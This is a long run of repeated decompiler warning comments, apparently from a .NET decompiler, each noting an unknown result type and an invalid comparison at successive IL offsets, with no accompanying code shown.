		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Invalid comparison between Unknown and I4
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_0153: Invalid comparison between Unknown and I4
		//IL_017a: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Invalid comparison between Unknown and I4
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Invalid comparison between Unknown and I4
		//IL_01ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d1: Invalid comparison between Unknown and I4
		//IL_01f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Invalid comparison between Unknown and I4
		//IL_0222: Unknown result type (might be due to invalid IL or missing references)
		//IL_0225: Invalid comparison between Unknown and I4
		//IL_024c: Unknown result type (might be due to invalid IL or missing references)
		//IL_024f: Invalid comparison between Unknown and I4
		//IL_0276: Unknown result type (might be due to invalid IL or missing references)
		//IL_0279: Invalid comparison between Unknown and I4
		//IL_02a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a3: Invalid comparison between Unknown and I4
		//IL_02ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cd: Invalid comparison between Unknown and I4
		//IL_02f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f7: Invalid comparison between Unknown and I4
		//IL_031e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0321: Invalid comparison between Unknown and I4
		//IL_0348: Unknown result type (might be due to invalid IL or missing references)
		//IL_034b: Invalid comparison between Unknown and I4
		//IL_0372: Unknown result type (might be due to invalid IL or missing references)
		//IL_0375: Invalid comparison between Unknown and I4
		//IL_039c: Unknown result type (might be due to invalid IL or missing references)
		//IL_039f: Invalid comparison between Unknown and I4
		//IL_03c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c9: Invalid comparison between Unknown and I4
		//IL_03f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f3: Invalid comparison between Unknown and I4
		//IL_041a: Unknown result type (might be due to invalid IL or missing references)
		//IL_041d: Invalid comparison between Unknown and I4
		//IL_0444: Unknown result type (might be due to invalid IL or missing references)
		//IL_0447: Invalid comparison between Unknown and I4
		//IL_046e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0471: Invalid comparison between Unknown and I4
		//IL_0498: Unknown result type (might be due to invalid IL or missing references)
		//IL_049b: Invalid comparison between Unknown and I4
		//IL_04c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c5: Invalid comparison between Unknown and I4
		//IL_04ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ef: Invalid comparison between Unknown and I4
		//IL_0516: Unknown result type (might be due to invalid IL or missing references)
		//IL_0519: Invalid comparison between Unknown and I4
		//IL_0540: Unknown result type (might be due to invalid IL or missing references)
		//IL_0543: Invalid comparison between Unknown and I4
		//IL_056a: Unknown result type (might be due to invalid IL or missing references)
		//IL_056d: Invalid comparison between Unknown and I4
		//IL_0594: Unknown result type (might be due to invalid IL or missing references)
		//IL_0597: Invalid comparison between Unknown and I4
		//IL_05be: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c1: Invalid comparison between Unknown and I4
		//IL_05e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_05eb: Invalid comparison between Unknown and I4
		//IL_0612: Unknown result type (might be due to invalid IL or missing references)
		//IL_0615: Invalid comparison between Unknown and I4
		//IL_063c: Unknown result type (might be due to invalid IL or missing references)
		//IL_063f: Invalid comparison between Unknown and I4
		//IL_0666: Unknown result type (might be due to invalid IL or missing references)
		//IL_0669: Invalid comparison between Unknown and I4
		//IL_0690: Unknown result type (might be due to invalid IL or missing references)
		//IL_0693: Invalid comparison between Unknown and I4
		//IL_06ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_06bd: Invalid comparison between Unknown and I4
		//IL_06e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e7: Invalid comparison between Unknown and I4
		//IL_070e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0711: Invalid comparison between Unknown and I4
		//IL_0738: Unknown result type (might be due to invalid IL or missing references)
		//IL_073b: Invalid comparison between Unknown and I4
		//IL_0762: Unknown result type (might be due to invalid IL or missing references)
		//IL_0765: Invalid comparison between Unknown and I4
		//IL_078c: Unknown result type (might be due to invalid IL or missing references)
		//IL_078f: Invalid comparison between Unknown and I4
		//IL_07b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07bc: Invalid comparison between Unknown and I4
		//IL_07e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e9: Invalid comparison between Unknown and I4
		//IL_0810: Unknown result type (might be due to invalid IL or missing references)
		//IL_0816: Invalid comparison between Unknown and I4
		//IL_083d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0843: Invalid comparison between Unknown and I4
		//IL_086a: Unknown result type (might be due to invalid IL or missing references)
		//IL_086c: Invalid comparison between Unknown and I4
		//IL_0893: Unknown result type (might be due to invalid IL or missing references)
		//IL_0899: Invalid comparison between Unknown and I4
		//IL_08c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_08c6: Invalid comparison between Unknown and I4
		//IL_08ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f3: Invalid comparison between Unknown and I4
		//IL_091a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0920: Invalid comparison between Unknown and I4
		//IL_0947: Unknown result type (might be due to invalid IL or missing references)
		//IL_094d: Invalid comparison between Unknown and I4
		//IL_0974: Unknown result type (might be due to invalid IL or missing references)
		//IL_097a: Invalid comparison between Unknown and I4
		//IL_09a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_09a4: Invalid comparison between Unknown and I4
		//IL_09cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_09ce: Invalid comparison between Unknown and I4
		//IL_09f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f8: Invalid comparison between Unknown and I4
		//IL_0a1f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a22: Invalid comparison between Unknown and I4
		//IL_0a49: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a4c: Invalid comparison between Unknown and I4
		//IL_0a73: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a76: Invalid comparison between Unknown and I4
		//IL_0a9d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aa0: Invalid comparison between Unknown and I4
		//IL_0ac7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aca: Invalid comparison between Unknown and I4
		//IL_0af1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af4: Invalid comparison between Unknown and I4
		//IL_0b1b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b1e: Invalid comparison between Unknown and I4
		//IL_0b45: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b48: Invalid comparison between Unknown and I4
		//IL_0b6f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b72: Invalid comparison between Unknown and I4
		//IL_0b99: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b9c: Invalid comparison between Unknown and I4
		//IL_0bc3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bc6: Invalid comparison between Unknown and I4
		//IL_0bed: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bf0: Invalid comparison between Unknown and I4
		//IL_0c25: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c27: Invalid comparison between Unknown and I4
		//IL_0c5c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c5f: Invalid comparison between Unknown and I4
		//IL_0c86: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c89: Invalid comparison between Unknown and I4
		//IL_0cb0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cb3: Invalid comparison between Unknown and I4
		//IL_0cda: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cdd: Invalid comparison between Unknown and I4
		//IL_0d04: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d07: Invalid comparison between Unknown and I4
		//IL_0d2e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d31: Invalid comparison between Unknown and I4
		//IL_0d58: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d5b: Invalid comparison between Unknown and I4
		//IL_0d82: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d85: Invalid comparison between Unknown and I4
		//IL_0dac: Unknown result type (might be due to invalid IL or missing references)
		//IL_0daf: Invalid comparison between Unknown and I4
		//IL_0dd6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dd9: Invalid comparison between Unknown and I4
		//IL_0e00: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e03: Invalid comparison between Unknown and I4
		//IL_0e2a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e2d: Invalid comparison between Unknown and I4
		//IL_0e7e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e81: Invalid comparison between Unknown and I4
		//IL_0ea8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eab: Invalid comparison between Unknown and I4
		//IL_0ed2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ed5: Invalid comparison between Unknown and I4
		//IL_0efc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eff: Invalid comparison between Unknown and I4
		//IL_0f26: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f29: Invalid comparison between Unknown and I4
		//IL_0f50: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f53: Invalid comparison between Unknown and I4
		//IL_0f7a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f7d: Invalid comparison between Unknown and I4
		//IL_0fa4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fa7: Invalid comparison between Unknown and I4
		//IL_0fce: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fd1: Invalid comparison between Unknown and I4
		//IL_0ff8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ffb: Invalid comparison between Unknown and I4
		//IL_1022: Unknown result type (might be due to invalid IL or missing references)
		//IL_1025: Invalid comparison between Unknown and I4
		//IL_104c: Unknown result type (might be due to invalid IL or missing references)
		//IL_104f: Invalid comparison between Unknown and I4
		//IL_1076: Unknown result type (might be due to invalid IL or missing references)
		//IL_1079: Invalid comparison between Unknown and I4
		//IL_10a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_10a3: Invalid comparison between Unknown and I4
		//IL_10ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_10cd: Invalid comparison between Unknown and I4
		//IL_10f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_10f7: Invalid comparison between Unknown and I4
		//IL_111e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1121: Invalid comparison between Unknown and I4
		//IL_1148: Unknown result type (might be due to invalid IL or missing references)
		//IL_114b: Invalid comparison between Unknown and I4
		//IL_1172: Unknown result type (might be due to invalid IL or missing references)
		//IL_1175: Invalid comparison between Unknown and I4
		//IL_119c: Unknown result type (might be due to invalid IL or missing references)
		//IL_119f: Invalid comparison between Unknown and I4
		//IL_11c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_11c9: Invalid comparison between Unknown and I4
		//IL_11f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_11f3: Invalid comparison between Unknown and I4
		//IL_121a: Unknown result type (might be due to invalid IL or missing references)
		//IL_121d: Invalid comparison between Unknown and I4
		//IL_1244: Unknown result type (might be due to invalid IL or missing references)
		//IL_1247: Invalid comparison between Unknown and I4
		//IL_126e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1271: Invalid comparison between Unknown and I4
		//IL_1298: Unknown result type (might be due to invalid IL or missing references)
		//IL_129b: Invalid comparison between Unknown and I4
		//IL_12c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_12c5: Invalid comparison between Unknown and I4
		//IL_12ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_12ef: Invalid comparison between Unknown and I4
		//IL_1316: Unknown result type (might be due to invalid IL or missing references)
		//IL_1319: Invalid comparison between Unknown and I4
		//IL_1340: Unknown result type (might be due to invalid IL or missing references)
		//IL_1343: Invalid comparison between Unknown and I4
		//IL_136a: Unknown result type (might be due to invalid IL or missing references)
		//IL_136d: Invalid comparison between Unknown and I4
		//IL_1394: Unknown result type (might be due to invalid IL or missing references)
		//IL_1397: Invalid comparison between Unknown and I4
		//IL_13be: Unknown result type (might be due to invalid IL or missing references)
		//IL_13c1: Invalid comparison between Unknown and I4
		//IL_13e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_13eb: Invalid comparison between Unknown and I4
		//IL_1412: Unknown result type (might be due to invalid IL or missing references)
		//IL_1415: Invalid comparison between Unknown and I4
		//IL_143c: Unknown result type (might be due to invalid IL or missing references)
		//IL_143f: Invalid comparison between Unknown and I4
		//IL_1466: Unknown result type (might be due to invalid IL or missing references)
		//IL_1469: Invalid comparison between Unknown and I4
		//IL_1490: Unknown result type (might be due to invalid IL or missing references)
		//IL_1493: Invalid comparison between Unknown and I4
		//IL_14ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_14bd: Invalid comparison between Unknown and I4
		//IL_14e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_14e7: Invalid comparison between Unknown and I4
		//IL_150e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1511: Invalid comparison between Unknown and I4
		//IL_1538: Unknown result type (might be due to invalid IL or missing references)
		//IL_153b: Invalid comparison between Unknown and I4
		//IL_1562: Unknown result type (might be due to invalid IL or missing references)
		//IL_1565: Invalid comparison between Unknown and I4
		//IL_158c: Unknown result type (might be due to invalid IL or missing references)
		//IL_158f: Invalid comparison between Unknown and I4
		//IL_15b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_15b9: Invalid comparison between Unknown and I4
		//IL_15e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_15e3: Invalid comparison between Unknown and I4
		//IL_160a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1610: Invalid comparison between Unknown and I4
		//IL_1637: Unknown result type (might be due to invalid IL or missing references)
		//IL_163d: Invalid comparison between Unknown and I4
		//IL_1664: Unknown result type (might be due to invalid IL or missing references)
		//IL_166a: Invalid comparison between Unknown and I4
		//IL_1691: Unknown result type (might be due to invalid IL or missing references)
		//IL_1697: Invalid comparison between Unknown and I4
		//IL_16be: Unknown result type (might be due to invalid IL or missing references)
		//IL_16c4: Invalid comparison between Unknown and I4
		//IL_16eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_16f1: Invalid comparison between Unknown and I4
		//IL_1718: Unknown result type (might be due to invalid IL or missing references)
		//IL_171e: Invalid comparison between Unknown and I4
		//IL_1745: Unknown result type (might be due to invalid IL or missing references)
		//IL_174b: Invalid comparison between Unknown and I4
		//IL_1772: Unknown result type (might be due to invalid IL or missing references)
		//IL_1778: Invalid comparison between Unknown and I4
		//IL_179f: Unknown result type (might be due to invalid IL or missing references)
		//IL_17a5: Invalid comparison between Unknown and I4
		//IL_17cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_17cf: Invalid comparison between Unknown and I4
		//IL_17f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_17f9: Invalid comparison between Unknown and I4
		//IL_1820: Unknown result type (might be due to invalid IL or missing references)
		//IL_1823: Invalid comparison between Unknown and I4
		//IL_184a: Unknown result type (might be due to invalid IL or missing references)
		//IL_184d: Invalid comparison between Unknown and I4
		//IL_1874: Unknown result type (might be due to invalid IL or missing references)
		//IL_1877: Invalid comparison between Unknown and I4
		//IL_189e: Unknown result type (might be due to invalid IL or missing references)
		//IL_18a1: Invalid comparison between Unknown and I4
		//IL_18c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_18cb: Invalid comparison between Unknown and I4
		//IL_18f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_18f5: Invalid comparison between Unknown and I4
		//IL_191c: Unknown result type (might be due to invalid IL or missing references)
		//IL_191f: Invalid comparison between Unknown and I4
		//IL_1946: Unknown result type (might be due to invalid IL or missing references)
		//IL_1949: Invalid comparison between Unknown and I4
		//IL_1970: Unknown result type (might be due to invalid IL or missing references)
		//IL_1973: Invalid comparison between Unknown and I4
		//IL_199a: Unknown result type (might be due to invalid IL or missing references)
		//IL_199d: Invalid comparison between Unknown and I4
		//IL_19c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_19c7: Invalid comparison between Unknown and I4
		//IL_19ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_19f1: Invalid comparison between Unknown and I4
		//IL_1a18: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a1b: Invalid comparison between Unknown and I4
		//IL_1a50: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a52: Invalid comparison between Unknown and I4
		//IL_1a87: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a8a: Invalid comparison between Unknown and I4
		//IL_1ab1: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ab4: Invalid comparison between Unknown and I4
		//IL_1adb: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ade: Invalid comparison between Unknown and I4
		//IL_1b05: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b08: Invalid comparison between Unknown and I4
		//IL_1b2f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b32: Invalid comparison between Unknown and I4
		//IL_1b59: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b5c: Invalid comparison between Unknown and I4
		//IL_1b83: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b86: Invalid comparison between Unknown and I4
		//IL_1bad: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bb0: Invalid comparison between Unknown and I4
		//IL_1bd7: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bda: Invalid comparison between Unknown and I4
		//IL_1c01: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c04: Invalid comparison between Unknown and I4
		//IL_1c2b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c2e: Invalid comparison between Unknown and I4
		//IL_1c55: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c58: Invalid comparison between Unknown and I4
		//IL_1ca6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ca9: Invalid comparison between Unknown and I4
		//IL_1cd0: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cd3: Invalid comparison between Unknown and I4
		//IL_1cfa: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cfd: Invalid comparison between Unknown and I4
		//IL_1d24: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d27: Invalid comparison between Unknown and I4
		//IL_1d4e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d51: Invalid comparison between Unknown and I4
		//IL_1d78: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d7b: Invalid comparison between Unknown and I4
		//IL_1da2: Unknown result type (might be due to invalid IL or missing references)
		//IL_1da5: Invalid comparison between Unknown and I4
		//IL_1dcc: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dcf: Invalid comparison between Unknown and I4
		//IL_1df6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1df9: Invalid comparison between Unknown and I4
		//IL_1e20: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e23: Invalid comparison between Unknown and I4
		//IL_1e4a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e4d: Invalid comparison between Unknown and I4
		//IL_1e74: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e77: Invalid comparison between Unknown and I4
		//IL_1e9e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ea1: Invalid comparison between Unknown and I4
		//IL_1ec8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ecb: Invalid comparison between Unknown and I4
		//IL_1ef2: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ef5: Invalid comparison between Unknown and I4
		//IL_1f1c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f1f: Invalid comparison between Unknown and I4
		//IL_1f46: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f49: Invalid comparison between Unknown and I4
		//IL_1f70: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f73: Invalid comparison between Unknown and I4
		//IL_1f9a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f9d: Invalid comparison between Unknown and I4
		//IL_1fc4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fc7: Invalid comparison between Unknown and I4
		//IL_1fee: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ff1: Invalid comparison between Unknown and I4
		//IL_2018: Unknown result type (might be due to invalid IL or missing references)
		//IL_201b: Invalid comparison between Unknown and I4
		//IL_2042: Unknown result type (might be due to invalid IL or missing references)
		//IL_2045: Invalid comparison between Unknown and I4
		//IL_206c: Unknown result type (might be due to invalid IL or missing references)
		//IL_206f: Invalid comparison between Unknown and I4
		//IL_2096: Unknown result type (might be due to invalid IL or missing references)
		//IL_2099: Invalid comparison between Unknown and I4
		//IL_20c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_20c3: Invalid comparison between Unknown and I4
		//IL_20ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_20ed: Invalid comparison between Unknown and I4
		//IL_2114: Unknown result type (might be due to invalid IL or missing references)
		//IL_2117: Invalid comparison between Unknown and I4
		//IL_213e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2141: Invalid comparison between Unknown and I4
		//IL_2168: Unknown result type (might be due to invalid IL or missing references)
		//IL_216b: Invalid comparison between Unknown and I4
		//IL_2192: Unknown result type (might be due to invalid IL or missing references)
		//IL_2195: Invalid comparison between Unknown and I4
		//IL_21bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_21bf: Invalid comparison between Unknown and I4
		//IL_21e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_21e9: Invalid comparison between Unknown and I4
		//IL_2210: Unknown result type (might be due to invalid IL or missing references)
		//IL_2213: Invalid comparison between Unknown and I4
		//IL_223a: Unknown result type (might be due to invalid IL or missing references)
		//IL_223d: Invalid comparison between Unknown and I4
		//IL_2264: Unknown result type (might be due to invalid IL or missing references)
		//IL_2267: Invalid comparison between Unknown and I4
		//IL_228e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2294: Invalid comparison between Unknown and I4
		//IL_22bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_22c1: Invalid comparison between Unknown and I4
		//IL_22e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_22ee: Invalid comparison between Unknown and I4
		//IL_2315: Unknown result type (might be due to invalid IL or missing references)
		//IL_231b: Invalid comparison between Unknown and I4
		//IL_2342: Unknown result type (might be due to invalid IL or missing references)
		//IL_2348: Invalid comparison between Unknown and I4
		//IL_236f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2375: Invalid comparison between Unknown and I4
		//IL_239c: Unknown result type (might be due to invalid IL or missing references)
		//IL_23a2: Invalid comparison between Unknown and I4
		//IL_23c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_23cf: Invalid comparison between Unknown and I4
		//IL_23f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_23fc: Invalid comparison between Unknown and I4
		//IL_2423: Unknown result type (might be due to invalid IL or missing references)
		//IL_2429: Invalid comparison between Unknown and I4
		//IL_2450: Unknown result type (might be due to invalid IL or missing references)
		//IL_2453: Invalid comparison between Unknown and I4
		//IL_247a: Unknown result type (might be due to invalid IL or missing references)
		//IL_247d: Invalid comparison between Unknown and I4
		//IL_24a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_24a7: Invalid comparison between Unknown and I4
		//IL_24ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_24d1: Invalid comparison between Unknown and I4
		//IL_24f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_24fb: Invalid comparison between Unknown and I4
		//IL_2522: Unknown result type (might be due to invalid IL or missing references)
		//IL_2525: Invalid comparison between Unknown and I4
		//IL_254c: Unknown result type (might be due to invalid IL or missing references)
		//IL_254f: Invalid comparison between Unknown and I4
		//IL_2576: Unknown result type (might be due to invalid IL or missing references)
		//IL_2579: Invalid comparison between Unknown and I4
		//IL_25a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_25a3: Invalid comparison between Unknown and I4
		//IL_25ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_25cd: Invalid comparison between Unknown and I4
		//IL_25f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_25f7: Invalid comparison between Unknown and I4
		//IL_261e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2621: Invalid comparison between Unknown and I4
		//IL_2648: Unknown result type (might be due to invalid IL or missing references)
		//IL_264b: Invalid comparison between Unknown and I4
		//IL_2672: Unknown result type (might be due to invalid IL or missing references)
		//IL_2675: Invalid comparison between Unknown and I4
		//IL_269c: Unknown result type (might be due to invalid IL or missing references)
		//IL_269f: Invalid comparison between Unknown and I4
		//IL_26d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_26d6: Invalid comparison between Unknown and I4
		//IL_270b: Unknown result type (might be due to invalid IL or missing references)
		//IL_270e: Invalid comparison between Unknown and I4
		//IL_2735: Unknown result type (might be due to invalid IL or missing references)
		//IL_2738: Invalid comparison between Unknown and I4
		//IL_275f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2762: Invalid comparison between Unknown and I4
		//IL_2789: Unknown result type (might be due to invalid IL or missing references)
		//IL_278c: Invalid comparison between Unknown and I4
		//IL_27b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_27b6: Invalid comparison between Unknown and I4
		//IL_27dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_27e0: Invalid comparison between Unknown and I4
		//IL_2807: Unknown result type (might be due to invalid IL or missing references)
		//IL_280a: Invalid comparison between Unknown and I4
		//IL_2831: Unknown result type (might be due to invalid IL or missing references)
		//IL_2834: Invalid comparison between Unknown and I4
		//IL_285b: Unknown result type (might be due to invalid IL or missing references)
		//IL_285e: Invalid comparison between Unknown and I4
		//IL_2885: Unknown result type (might be due to invalid IL or missing references)
		//IL_2888: Invalid comparison between Unknown and I4
		//IL_28af: Unknown result type (might be due to invalid IL or missing references)
		//IL_28b2: Invalid comparison between Unknown and I4
		//IL_28d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_28dc: Invalid comparison between Unknown and I4
		//IL_292d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2930: Invalid comparison between Unknown and I4
		//IL_2957: Unknown result type (might be due to invalid IL or missing references)
		//IL_295a: Invalid comparison between Unknown and I4
		//IL_2981: Unknown result type (might be due to invalid IL or missing references)
		//IL_2984: Invalid comparison between Unknown and I4
		//IL_29ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_29ae: Invalid comparison between Unknown and I4
		//IL_29d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_29d8: Invalid comparison between Unknown and I4
		//IL_29ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a02: Invalid comparison between Unknown and I4
		//IL_2a29: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a2c: Invalid comparison between Unknown and I4
		//IL_2a53: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a56: Invalid comparison between Unknown and I4
		//IL_2a7d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a80: Invalid comparison between Unknown and I4
		//IL_2aa7: Unknown result type (might be due to invalid IL or missing references)
		//IL_2aaa: Invalid comparison between Unknown and I4
		//IL_2ad1: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ad4: Invalid comparison between Unknown and I4
		//IL_2afb: Unknown result type (might be due to invalid IL or missing references)
		//IL_2afe: Invalid comparison between Unknown and I4
		//IL_2b25: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b28: Invalid comparison between Unknown and I4
		//IL_2b4f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b52: Invalid comparison between Unknown and I4
		//IL_2b79: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b7c: Invalid comparison between Unknown and I4
		//IL_2ba3: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ba6: Invalid comparison between Unknown and I4
		//IL_2bcd: Unknown result type (might be due to invalid IL or missing references)
		//IL_2bd0: Invalid comparison between Unknown and I4
		//IL_2bf7: Unknown result type (might be due to invalid IL or missing references)
		//IL_2bfa: Invalid comparison between Unknown and I4
		//IL_2c21: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c24: Invalid comparison between Unknown and I4
		//IL_2c4b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c4e: Invalid comparison between Unknown and I4
		//IL_2c75: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c78: Invalid comparison between Unknown and I4
		//IL_2c9f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ca2: Invalid comparison between Unknown and I4
		//IL_2cc9: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ccc: Invalid comparison between Unknown and I4
		//IL_2cf3: Unknown result type (might be due to invalid IL or missing references)
		//IL_2cf6: Invalid comparison between Unknown and I4
		//IL_2d1d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d20: Invalid comparison between Unknown and I4
		//IL_2d47: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d4a: Invalid comparison between Unknown and I4
		//IL_2d71: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d74: Invalid comparison between Unknown and I4
		//IL_2d9b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d9e: Invalid comparison between Unknown and I4
		//IL_2dc5: Unknown result type (might be due to invalid IL or missing references)
		//IL_2dc8: Invalid comparison between Unknown and I4
		//IL_2def: Unknown result type (might be due to invalid IL or missing references)
		//IL_2df2: Invalid comparison between Unknown and I4
		//IL_2e19: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e1c: Invalid comparison between Unknown and I4
		//IL_2e43: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e46: Invalid comparison between Unknown and I4
		//IL_2e6d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e70: Invalid comparison between Unknown and I4
